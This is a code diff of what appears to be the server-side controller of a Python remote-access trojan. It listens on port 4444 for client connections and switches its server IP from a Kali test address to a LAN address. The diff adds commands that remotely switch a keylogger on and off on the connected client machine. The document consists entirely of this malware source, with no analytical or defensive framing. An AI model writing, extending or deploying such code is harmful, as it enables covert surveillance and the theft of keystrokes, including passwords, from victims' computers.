@@ -17,6 +17,7 @@ from time import sleep, strftime
 from threading import Thread
 from os import path
 
+
 from miscs.colors import fColors, bColors
 from miscs.string_format import StringFormat
 
@@ -33,13 +34,14 @@ arrAddresses = []  # Store All Socket Connection Addresses
 arrConnections = []  # Store All Connection Information about Socket Connections
 
 # TODO: for testing change SERVER_HOST to Kali WSL IP Address
-SERVER_HOST = "172.29.132.195"  # Kali WSL IP Address, Server for testing
-# SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
+# SERVER_HOST = "172.29.132.195"  # Kali WSL IP Address, Server for testing
+SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
 SERVER_PORT = 4444  # Server Port
 
 intBuff = 1024  # Maximum Size(Bytes) of Data to Receive as
 
 # objSocket = None      # Socket Object
+
 
 # Step 3: Define Global lambda's
 decode_utf8 = lambda data: data.decode("utf-8")
@@ -412,6 +414,16 @@ def send_commands():
         elif strChoice == '--h' or strChoice == 'help':
             commands_help()
             continue
+
+        # --k 1: Used to Start Key Logger on the Client
+        elif strChoice == '--k 1' or strChoice == 'keylog on':
+            send(b'keylogon')
+            print(decode_utf8(recv(intBuff)))
+
+        elif strChoice == '--k 0' or strChoice == 'keylog off':
+            send(b'keylogoff')
+            # print(decode_utf8(recv(intBuff)))
+
 
         # --x or exit: Command for Close Server, Client and Connection in Command MODE
         elif strChoice == '--x' or strChoice == 'exit':
